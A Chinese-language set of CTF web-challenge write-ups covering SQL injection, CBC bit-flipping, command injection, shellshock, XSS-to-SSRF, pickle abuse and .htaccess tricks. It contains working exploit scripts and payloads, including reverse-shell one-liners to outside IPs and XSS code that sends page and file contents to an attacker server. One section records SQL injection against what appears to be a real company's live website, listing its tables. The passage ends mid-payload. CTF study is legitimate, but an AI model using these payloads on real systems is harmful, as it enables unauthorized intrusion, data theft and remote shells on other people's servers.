### blgdel

这题很有意思,刚开始看的时候以为会是sql注入,结果最后是奇葩的变量覆盖+.htaccess文件利用

注册登录,sql注入,目录扫描都做一遍

找到了sql.txt和config.txt

```php
<?php

class master
{
	private $path;
	private $name;
	
	function __construct()
	{
		
	}
	
	function stream_open($path)
	{
		if(!preg_match('/(.*)\/(.*)$/s',$path,$array,0,9))
			return 1;
		$a=$array[1];
		parse_str($array[2],$array);
		
		if(isset($array['path']))
		{
			$this->path=$array['path'];
		}
		else
			return 1;
		if(isset($array['name']))
		{
			$this->name=$array['name'];
		}
		else
			return 1;
		
		if($a==='upload')
		{
			return $this->upload($this->path,$this->name);
		}
		elseif($a==='search')
		{
			return $this->search($this->path,$this->name);
		}
		else 
			return 1;
	}
	function upload($path,$name)
	{
		if(!preg_match('/^uploads\/[a-z]{10}\/$/is',$path)||empty($_FILES[$name]['tmp_name']))
			return 1;
		
		$filename=$_FILES[$name]['name'];
		echo $filename;
		
		$file=file_get_contents($_FILES[$name]['tmp_name']);
		
		$file=str_replace('<','!',$file);
		$file=str_replace(urldecode('%03'),'!',$file);
		$file=str_replace('"','!',$file);
		$file=str_replace("'",'!',$file);
		$file=str_replace('.','!',$file);
		if(preg_match('/file:|http|pre|etc/is',$file))
		{
			echo 'illegalbbbbbb!';
			return 1;
		}
		
		file_put_contents($path.$filename,$file);
		file_put_contents($path.'user.jpg',$file);
		
		
		echo 'upload success!';
		return 1;
	}
	function search($path,$name)
	{
		if(!is_dir($path))
		{
			echo 'illegal!';
			return 1;
		}
		$files=scandir($path);
		echo '</br>';
		foreach($files as $k=>$v)
		{
			if(str_ireplace($name,'',$v)!==$v)
			{
				echo $v.'</br>';
			}
		}
		
		return 1;
	}
	
	function stream_eof()
	{
		return true;
	}
	function stream_read()
	{
		return '';
	}
	function stream_stat()
	{
		return '';
	}
	
}

stream_wrapper_unregister('php');
stream_wrapper_unregister('phar');
stream_wrapper_unregister('zip');
stream_wrapper_register('master','master');

?>
```



```php
CREATE DATABASE `sshop` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;
USE `sshop`;
CREATE TABLE `sshop`.`users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NULL DEFAULT NULL,
  `mail` varchar(255) NULL DEFAULT NULL,
  `password` varchar(255) NULL DEFAULT NULL,
  `point` varchar(255) NULL DEFAULT NULL,
  `shopcar` varchar(255) NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
```

sql.txt迷惑了我一段时间,最后是我自己的惰性拯救了我,让我懒得去sql注入

分析config.txt

upload函数根本不可能上传php代码

在stream_open()函数中:`parse_str($array[2],$array);`存在变量覆盖的问题

`master://search/path=xxx&name=xxx&path=wanted`

最后的结果为`$path=wanted`

结合search就可以遍历目录了

懒得写脚本手动遍历233333

但是实际测试的时候发现根本没有办法输入/导致我卡了好久

最后看别人的wp发现将/ url编码后可以目录变量23333这是啥？？？

最后找到flag的payload为:

name:`f&path=..%2f..%2f..%2f..%2fhome`

![image.png](https://i.loli.net/2019/09/24/gSG7tVquT4bARjk.png)

接下来就是考虑如何读取flag了

利用.htaccess的设置php_value auto_prepend_file /home/hiahiahia_flag

由于pre在黑名单中最后的内容为

`php_value auto_pr\
epend_file /home/hiahiahia_flag`

![image.png](https://i.loli.net/2019/09/24/YNZnlJ4fHC3ycKa.png)

## bugku

### login3

这题我没有认真的做分析记录，如果有了分析记录可能有就会自己独立完成

收获:

绕过空格:^,&&,||,括号综合利用

绕过逗号:mid('a'from(1))





测试admin,123说密码错误,再随便测试发现,会提示username doesn't exist 说明网站的查询语句可能是

```php
$sql1='select * from user where username='+$_POST['user'];
```

根据题目的提示：盲注,说明盲注点很有可能在这里

测试黑名单

> 空格,*,and,逗号,=,for，union

for(大小写混合都不行)在黑名单中意味着我们无法查找表名和字段名,只能靠猜测表名了

猜测表名为admin,user,password



因为空格在黑名单所以可以用^，&&,||来绕过

验证:admin'&&0#成功



验证表名adminn'&&(select(1)from(admin))#,表名为admin

盲注格式:admin'ascii(mid(('a')from(1)))#

猜测字段名:password,pass,pwd

=admin'&&ascii(mid((select(password)from(admin))from(1)))#

字段名为password



盲注脚本跑起来

```python
import requests
def judge(index,guess):
    username="admin'&&ascii(mid((select(password)from(admin))from(index)))<>guess#"
    url='http://123.206.31.85:49167/index.php'
    rusername=username.replace('index',str(index)).replace('guess',str(guess))
    result=requests.post(url,data={'username':rusername,'password':'123456'}).text
    if 'password error!' in result:
        print('第'+str(index)+'个字符不是'+chr(guess))
        return 0
    print('第'+str(index)+'个字符是'+chr(guess))
    return 1

result=''
index=1
while 1:
    alpha=0
    
    for i in range(32,128):
        if judge(index,i):
            alpha=i
            result+=chr(i)
            break
    if alpha==0:
        print('爆破完成:'+result)
        break
    index+=1

```

得到:51b7a76d51e70b419f60d3473fb6f900

这个是md5加密后的,解密得到skctf123456

flag: SKCTF{b1iNd_SQL_iNJEcti0n!}

### login 4

cbc字节翻转攻击



根据别人的wp,发现vim不正常退出产生的文件.index.php.swp,`vim -r` 获得源码

```php
<?php
define("SECRET_KEY", file_get_contents('/root/key'));
define("METHOD", "aes-128-cbc");
session_start();

function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION['username'] = $info['username'];
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}

function check_login(){
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}

function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo $flag;
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}

if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');
    }else{
        $info = array('username'=>$username,'password'=>$password);
        login($info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '<body class="login-body">
                <div id="wrapper">
                    <div class="user-icon"></div>
                    <div class="pass-icon"></div>
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>
                        </div>
                        <div class="content">
                        <input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" />
                        <input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <input type="submit" name="submit" value="Login" class="button" />
                        </div>
                    </form>
                </div>
            </body>';
    }
}
?>
```

阅读代码发现通过控制cipher的值进而控制session的值来获得flag

因为这是一个cbc加密后的字符串而我们又知道它的明文,通过cbc字节翻转来攻击

字节翻转攻击

```python
import base64
iv='w+tXOtqCoxQHWWvQOzLYDg=='.decode('base64')
ci="CVWXZDimKKgGoXMsKos0UOHdMzG/d2bB+v1WqC6bOongufcRUyB5fgiiJdlLG1CDwKCfkdXXzCrru0wL2F749g==".decode('base64')
old='a:2:{s:8:"username";s:5:"skctf";s:8:"password";s:5:"skctf";}'[16:32]
new='a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"skctf";}'[16:32]
for i in range(16):
        ci=ci[:i]+chr(ord(ci[i])^ord(old[i])^ord(new[i]))+ci[i+1:]

```

得到![](http://ww1.sinaimg.cn/large/006pWR9agy1g5y9g9f9t6j310t02bglp.jpg)

解码后:

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5y9gny8nxj30dc01ja9v.jpg)

我们要回复前面的值,而题目又给了我们初始变量iv,所以按刚刚的步骤再来一下即可

### login2

收获: 不仅可以过滤输入,还可以过滤输出



提示:union,命令执行

看到http里的tip:

```php
$sql="SELECT username,password FROM admin WHERE username='".$username."'";
if (!empty($row) && $row['password']===md5($password)){
}
```

payload:`aaaaa'/**/union/**/select/**/'aaaaa','cfcd208495d565ef66e7dff9f98764da'#`

进入![](http://ww1.sinaimg.cn/large/006pWR9agy1g5ya1d4t7cj30db05d0su.jpg)

黑名单:`|,&,空格,像引号一样的东西`

输入a和'a'发现结果不同,猜测引号被过滤,或者在引号里面

输入a和a;发现结果不同,猜测分号被过滤,或者在引号里面

输入#无任何显示,输入不在引号内

`0'#和0"#均无回显`,

过滤名单:`'',"",#;`

猜测php代码

`echo system('ps -aux | grep '.$u)`



最后还是没做出来,去看别人的wp了

有两种解法

#### 解法1

我刚刚的那些猜测考虑的不够全面,以上结果还有一种可能就是过滤输出。

执行a;sleep 5发现延迟5秒，确定是过滤输出而不是过滤那些字符

接下来就是和sql盲注一样的原理

payload:123;a=\`ls\`;b="~";if [ "${a:3:1}"x == "$b"x ]; then sleep 5 ;fi;

构造payload(写shell语言)遇到的坑:

1. if 和方括号之间要有空格
2. $a == $b 之间也要有空格
3. 让字符串为空返回假,非空进行比较用

123;a=\`ls\`;b="~";if [ "${a:3:1}"x == "$b"x ]; then sleep 5 ;fi;

否则,字符串为空也会继续比较

附上exp:

```python
import requests
cookies = dict(PHPSESSID='uep9a3ja59naqj5rnuihbi5l62')

def guess(index,gue,post):
    data={'c':post}
    try:
        print(post)
        res=requests.post("http://123.206.31.85:49165/index.php",data=data,timeout=3,cookies=cookies)
        if 'login' in res:
            print("cookie失效")
        #input()
        print("第"+index+"个字符不是"+gue)
        return 0
    except requests.exceptions.ReadTimeout:
        print("第"+index+"个字符是"+gue)
        return 1
    except requests.exceptions.ConnectTimeout:
        print("第"+index+"个字符是"+gue)
        return 1
    except urllib3.exceptions.MaxRetryError:
        print("第"+index+"个字符是"+gue)
        return 1
    except urllib3.exceptions.ConnectTimeoutError:
        print("第"+index+"个字符是"+gue)
        return 1
def execc(command):
    post1="123;a=`"+command
    post2='`;b="'
    gue=""
    post3='";if [ "${a:'
    index=""
    post4=':1}"x == "$b"x ]; then sleep 5 ;fi;'
    count=0
    result=''
    while 1:
        alpha=''
        for i in range(0,127):
            index=str(count)
            gue=chr(i)
            print('gue 是:'+gue)
            if guess(index,gue,post1+post2+gue+post3+index+post4):
                alpha=gue
                result+=gue
                break
        if alpha=='':
            print("爆破完成:"+result)
            break
        print(result)
        count+=1
execc("ls")
```



#### 解法2

执行反弹shell的命令:

`|bash -i >& /dev/tcp/你的公网ip/8888 0>&1`

`nc -lvv 8888`

flag:为SKCTF{Uni0n_@nd_c0mM4nD_exEc}

### 实战2-注入

这个是真的实战。。。

给了一个网址:[http://www.kabelindo.co.id](http://www.kabelindo.co.id/)

在提示下找到了注入点。



测试

```
http://www.kabelindo.co.id/readnews.php?id=-5%20union%20select%201,2,3,database(),5#
对单引号和双引号进行了转义,尝试宽字节注入没用

用hex编码绕过

```

构造payload:id=-5%20union%20select%201,2,3,database(),5#

查询表名:id=`-5 union select 1,2,3,GROUP_CONCAT(table_name) ,5 FROM information_schema.tables WHERE TABLE_SCHEMA=database(); #`

table:**counter,csr,lowongan,mstdkb,mstdsg,mstpro,news,opsod,opsoh,pencarian,tabcus,tabgrp,tabmenu,tabmenu1,tabmenu2,tabprog,tabshp,tabslp,tabtcus,tabtmp,tabuser,tbnomax**

查询列名:id= `-5 union select 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name = 0x6373#`

flag: flag{tbnomax}

一个地方显示字数有限制。。。

## jarvis oj

### re?



这题看了别人的wp才知道怎么做

下载下来后文件名为`udf.so.XXXXX`，用mysql导入一下。具体过程如下。
将udf文件放到`/usr/lib/mysql/plugin/`文件夹中：

```
root@0e5b63de05fd:/usr/lib/mysql/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172
```



登陆mysql后，加载help_me函数：

```
mysql> create function help_me returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';Query OK, 0 rows affected (2.04 sec)
```



利用help_me函数：

```
mysql> select help_me();+---------------------------------------------+| help_me()                                   |+---------------------------------------------+| use getflag function to obtain your flag!! |+---------------------------------------------+1 row in set (0.17 sec)
```



利用udf再创建一个getflag函数。

```
mysql> create function getflag returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';Query OK, 0 rows affected (0.05 sec)
```



得到flag：

```
mysql> select getflag();+------------------------------------------+| getflag()                                |+------------------------------------------+| PCTF{Interesting_U5er_d3fined_Function} |+------------------------------------------+1 row in set (0.00 sec)
```

## hackme

###  hide and seek

这题给了主页的地址，我还以为是题目错了。。我还在想是不是排行榜的flag交了一下，过了，但是没解决，后来看了别人的wp想了又想最后还是在主页里查了下flag，提交成功。。。。。。。

### guestbook

最基础的sql注入

有个坑就是flag放在第二行，我还傻逼必的把第一行提供的图片做了各种分析

### ping

这题看过去ban掉了很多，但他千不该万不该没ban掉\`和*

### scoreboard

.....去看了源代码,还以管理员的方式登录,结果flag就在head里面。。

### login3

```php
function load_user()
{
    global $secret, $error;

    if(empty($_COOKIE['user'])) {
        return null;
    }

    $unserialized = json_decode(base64_decode($_COOKIE['user']), true);
    $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig'];

    if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {
        $error = 'Invalid session';
        return false;
    }

    $data = json_decode($unserialized['data'], true);
    return [
        'name' => $data[0],
        'admin' => $data[1]
    ];
}

```

一开始我还想着用sha那啥攻击

后来看到了!=，有希望，当"123"!=true为真,成功绕过

### login4

```php
if($_POST['name'] === 'admin') {
    if($_POST['password'] !== $password) {
        // show failed message if you input wrong password
        header('Location: ./?failed=1');
    }
}
```

重定向后面没加exit()

后面的代码仍然执行

### login6



```php
if(!empty($_POST['data'])) {
    try {
        $data = json_decode($_POST['data'], true);
    } catch (Exception $e) {
        $data = [];
    }
    extract($data);
    if($users[$username] && strcmp($users[$username], $password) == 0) {
        $user = $username;
    }
}
```

这题原本有两种思路的:1.extract变量覆盖2.字符串==true成立

但是题目的$user里没有admin的值,所以只能用变量覆盖,因为这个原因我卡了好久



### login8

大胆猜想小心求证

这次题目不给源码了

虽然我很快注意到了解题的关键cookie:login8cookie和login8sha512

我确认login8cookie是序列化，但是我却没有经过任何验证就在心中认定sha512是有密钥加密的.

最后看了别人的wp才走出自己的误区

### dafuq-manager 2

这题登入游客账号后，发现有个编辑，点进去看一下，试一下任意文件读取，成功

### dafuq-manager 3

代码审计软件真的好香。不过它的原理也只是用正则匹配敏感函数

发现有个debug模式

```php
<?php
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
function do_debug() {
	print("<br />".$GLOBALS['__GET']['command']);
	print("<br />".(make_command($GLOBALS['__GET']['command'])."<br />"));
    assert(strlen($GLOBALS['secret_key']) > 40);
    $dir = $GLOBALS['__GET']['dir'];
    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
        show_error('You are not hacky enough :(');
    }
    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
    $cmd = base64_decode($cmd);
    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);
    foreach ($bad_things as $bad) {
        if (stristr($cmd, $bad)) {
            die('2bad');
        }
    }
    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
        die(eval($cmd));
    } else {
        show_error('What does the fox say?');
    }
}
?>
```

阅读代码利用即可

### wordpress 1

这题刚看的时候以为是去看网页源代码。。

结果是看源代码。。仔细看一下发现博客里有提供备份文件

用正则匹配`.*f[l1][a4]g.*`

找到flag所在位置

```PHP
function print_f14g()
{
	$h = 'm'.sprintf('%s%d','d',-4+9e0);
	if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {
		if(wp_get_user_ip() === '127.0.0.1') {
			eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));
		} else {
			die('</head><body><h1>Sorry, Only admin from localhost can get flag');
		}
	}
}
```

### webshell

这题很简单，就是remote_addr不好搞,必须得用服务器来测

```php
<?php 
$cation = "str_rot13";
$e_obfus="base64_decode";
$e_cod = "gzinflate" ; 
$sourc ="strrev"; 
 function run() 
 { 
     if(isset($_GET['cmd']) ) 
     { 
         $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
         $key = $_SERVER['HTTP_USER_AGENT'] . sha1("webshell.hackme.inndy.tw"); 
         $sig = hash_hmac('SHA512', $cmd, $key); 
         echo  urlencode(hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd']);
         echo "<br />";
         echo hash_hmac('SHA512', $_GET['cmd'], $key); 

    } 
    return false; 
} 

    run();
?>
```

### command-executor

收获:shellshock



https://command-executor.hackme.inndy.tw/index.php

刚开始的时候以为是命令执行绕过,试过大部分绕过方法都没用后,观察url发现:https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env

func参数也可能是注入点,多次尝试发现这不是命令执行,猜测这是文件包含,试着用php://filter来读取源码成功.

```
cmd.php
index.php
ls.php
man.php
untar.php
```

代码审计时间......

花了好久都没看出啥,最后看别人的wp发现有shellshock漏洞

index.php:`putenv("$key=$val");`

[详解shellcode](https://blog.csdn.net/Anprou/article/details/72819989)

构造payload:`User-Agent: () { : ;};/bin/bash -i &> /dev/tcp/39.108.164.219/60000 0>&1;`

记住:;和两个花括号之间必须有空格

利用反弹shell

找到flag在根目录下,但是无法读取,但发现flag_reader和他的源码

```c
#include <unistd.h>
#include <syscall.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buff[4096], rnd[16], val[16];
	if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
		write(1, "Not enough random\n", 18);
	}

	setuid(1337);
	seteuid(1337);
	alarm(1);
	write(1, &rnd, sizeof(rnd));
	read(0, &val, sizeof(val));

	if(memcmp(rnd, val, sizeof(rnd)) == 0) {
		int fd = open(argv[1], O_RDONLY);
		if(fd > 0) {
			int s = read(fd, buff, 1024);
			if(s > 0) {
				write(1, buff, s);
			}
			close(fd);
		} else {
			write(1, "Can not open file\n", 18);
		}
	} else {
		write(1, "Wrong response\n", 16);
	}
}

```

`flag-reader flag > /var/tmp/aaa < /var/tmp/aaa`

最后的flag:FLAG{W0w U sh0cked m3 by 5h3115h0ck}

### xssrf_leak

收获:大开眼界,ssrf的一种方式

第一次做到ssrf的题目,虽然懂原理但不代表会利用。

在上一题的xss中得到<svg/onload=>可以利用,用admin的cookie登入,不行。

在看了别人的wp的时候发现可以ssrf,但是这里innerHTML属性被ban掉了,结合svg 会转化实体编码的特性将 代码转化为实体编码后便不存在黑名单了

读innerHTML的代码

`<svg/onload="document.location='http://xxxxx/'+document.innerHTML">`

得到

```html

<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
  <a class="navbar-brand" href="index.php">XSSRF</a>

  <ul class="navbar-nav">
    <li class="nav-item">
      <a class="nav-link" href="sendmail.php">Send Mail</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="mailbox.php">Mailbox</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="sentmail.php">Sent Mail</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="setadmin.php">Set Admin</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="request.php">Send Request</a>
    </li>
  </ul>

  <ul class="navbar-nav ml-auto">
    <li class="nav-item">
      <span class="navbar-text">Hello, admin (Administrator)</span>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="logout.php">Logout</a>
    </li>
  </ul>
</nav>

    <div class="container">

      <div class="card text-white bg-dark">
        <div class="card-body">
          <h2 class="card-title">
            aa          </h2>
          <h4>From: <a href="sendmail.php?to=ccreater">ccreater</a></h4>
          <div class="card-text"><svg onload="document.location='http://39.108.164.219:60000/'+btoa(document.body.innerHTML)"></svg></div>
        </div>
      </div>
    </div>
```

发现response.php结合题目这里就是我们进行ssrf的点

于是要访问response.php

```html
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("GET","request.php",true);
xmlhttp.send();
">
```

发现参数url,尝试php伪协议结合robots.txt,尝试读取/var/www/html/config.php

```html
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///var/www/html/config.php");
">
```

得到:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>XSSRF - Request</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
    <link rel="stylesheet" href="style.css" media="all">
    <style>pre { background-color: #eee; padding: 5px; }</style>
  </head>
  <body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
  <a class="navbar-brand" href="index.php">XSSRF</a>

  <ul class="navbar-nav">
    <li class="nav-item">
      <a class="nav-link" href="sendmail.php">Send Mail</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="mailbox.php">Mailbox</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="sentmail.php">Sent Mail</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="setadmin.php">Set Admin</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="request.php">Send Request</a>
    </li>
  </ul>

  <ul class="navbar-nav ml-auto">
    <li class="nav-item">
      <span class="navbar-text">Hello, admin (Administrator)</span>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="logout.php">Logout</a>
    </li>
  </ul>
</nav>

    <div class="container">

      <pre><code>&lt;&quest;php&NewLine;&NewLine;&sol;&sol; database config&NewLine;define&lpar;&apos;DB&lowbar;USER&apos;&comma; &apos;xssrf&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;PASS&apos;&comma; &apos;xssrfmeplz&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;HOST&apos;&comma; &apos;host&equals;localhost&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;NAME&apos;&comma; &apos;xssrf&apos;&rpar;&semi;&NewLine;&NewLine;&sol;&sol; redis config&NewLine;define&lpar;&apos;REDIS&lowbar;HOST&apos;&comma; &apos;localhost&apos;&rpar;&semi;&NewLine;define&lpar;&apos;REDIS&lowbar;PORT&apos;&comma; 25566&rpar;&semi;&NewLine;&NewLine;&sol;&sol; define flag&NewLine;define&lpar;&apos;FLAG&apos;&comma; &apos;FLAG&lbrace;curl -v -o flag --next flag&colon;&sol;&sol;in-the&period;redis&sol;the&quest;port&equals;25566&amp;good&equals;luck&rcub;&apos;&rpar;&semi;&NewLine;&NewLine;&dollar;c&lowbar;hardness &equals; 5&semi; &sol;&sol; how many proof of work leading zeros&NewLine;</code></pre>

      <form action="/request.php" method="POST">
        <div class="form-group">
          <label for="url">URL</label>
          <textarea name="url" class="form-control" id="url" aria-describedby="url" placeholder="URL" rows="10">file:///var/www/html/config.php</textarea>
        </div>

        <button class="btn btn-primary">Send Request</button>
      </form>
    </div>
  </body>
</html>

```

得到flag:FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&good=luck}



## 杂

### 2019suctf CheckIn

这一题是个文件上传,限制了后缀为ph*和.htaccess的文件

我一直试都没弄出来后来看别人的wp说使用.user.ini,fastcgi都可以用,学到了学到了



### suctf guess_game

[题目链接]( https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game )

考点:pickle

代码审计一波后

如果猜对10次后会给flag(机会只有10次)

因为知道是考pickle直接全局搜索pickle发现在server处有

`ticket = restricted_loads(ticket)`

其中ticket是我们可控点

跟进去看

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        if "guess_game" == module[0:10] and "__" not in name:
            return getattr(sys.modules[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

我们只能加载guess_game中的类,并且不能调用魔术方法.

在这一题中拿到flag有两种方式:

1. 命令执行
2. 通过游戏

在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了

而游戏中判定赢的条件是

```python
class Game
	def is_win(self):
        return self.win_count == max_round
```

如果我们能直接修改win_count或者max_round就可以拿到flag了

我们发现在`guess_game`中已经有一个`game = Game()`这个了,也就是我们可以利用pickle来加载这个game直接修改

那么接下来就是如何修改了

在pickle的操作码中我们发现

`BUILD          = b'b'   # call __setstate__ or __dict__.update()`这一条

其中update()就可以修改game的属性了

那么接下来就只有一个问题了,操作码`b`如何使用

一路跟踪发现b操作码的实现

```python
    def load_build(self):
        stack = self.stack
        state = stack.pop()
        inst = stack[-1]
        setstate = getattr(inst, "__setstate__", None)
        if setstate is not None:
            setstate(state)
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)
```

没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象

最后的payload:

```python
b"cguess_game\ngame\n(S'win_count'\nI10\nS'round_count'\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb."
```







### 2019xnusa ezphp

```php
<?php 
    $files = scandir('./');  
    foreach($files as $file) { 
        if(is_file($file)){ 
            if ($file !== "index.php") { 
                unlink($file); 
            } 
        } 
    } 
    include_once("fl3g.php"); 
    if(!isset($_GET['content']) || !isset($_GET['filename'])) { 
        highlight_file(__FILE__); 
        die(); 
    } 
    $content = $_GET['content']; 
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) { 
        echo "Hacker"; 
        die(); 
    } 
    $filename = $_GET['filename']; 
    if(preg_match("/[^a-z\.]/", $filename) == 1) { 
        echo "Hacker"; 
        die(); 
    } 
    $files = scandir('./');  
    foreach($files as $file) { 
        if(is_file($file)){ 
            if ($file !== "index.php") { 
                unlink($file); 
            } 
        } 
    } 
    file_put_contents($filename, $content . "\nJust one chance"); 
?>
```

这题说是easy,但对我来说却不easy

代码在刚开始和写文件之前会删除除了index.php之外的所有文件

但是却会包含f13g.php,有几种可能:web权限无法删除,不在这个目录,或者根本不存在只是作为题目的突破点。做完题目发现是第三种可能。

根据代码的行为,可以通过.htaccess和.user.ini来设置auto_preared_file为本身来实现代码执行

#### 解法一

利用.htaccess在换行前加一个\\ 将视两行为一行的特性来绕过黑名单的限制

payload:

`auto_prepend_fi\
le ".htaccess"
#<?php phpinfo();?>
#\`

#### 解法二

利用题目包含f13g.php的特性。

用.htaccess修改error_log的路径和文件名,将错误信息写入到/tmp/fl3g.php里,但是由于html编码错误信息,所以要编码要执行的代码

payload:

- 第一步，通过error_log配合include_path在tmp目录生成shell

```
php_value error_log /tmp/fl3g.php
php_value error_reporting 32767
php_value include_path "+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs"
# \
```

- 第二步，通过include_path和utf7编码执行shell

```
php_value include_path "/tmp"
php_value zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# \
```

#### 解法三

因为正则判断写的是`if(preg_match("/[^a-z\.]/", $filename) == 1) {`而不是`if(preg_match("/[^a-z\.]/", $filename) !== 0) {`，因此存在了被绕过的可能。 通过设置.htaccess

```
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```

导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。

payload:

first. 

```
/?filename=.htaccess&content=php_value pcre.backtrack_limit 0
php_value pcre.jit 0
#\
```

second.

```
